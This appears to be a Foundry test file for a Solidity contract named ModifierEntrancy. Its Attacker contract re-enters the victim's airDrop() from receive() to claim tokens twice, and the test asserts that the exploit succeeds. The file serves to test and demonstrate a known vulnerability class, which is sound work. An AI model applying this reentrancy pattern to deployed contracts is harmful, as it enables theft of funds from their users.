
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        vm.deal(address(_contractUnderTest), 1 ether);
        vm.deal(address(_attacker), 1 ether);
        vm.deal(address(this), 1 ether);

        _attacker.setupAttack();
        _attacker.attack();

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialBalance;

    constructor(address victimAddress) {
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack() public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack() public {
        initialBalance = _victim.tokenBalance(address(this));

        _victim.airDrop();

        if (_victim.tokenBalance(address(this)) > initialBalance) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.airDrop();
        }
    }
}
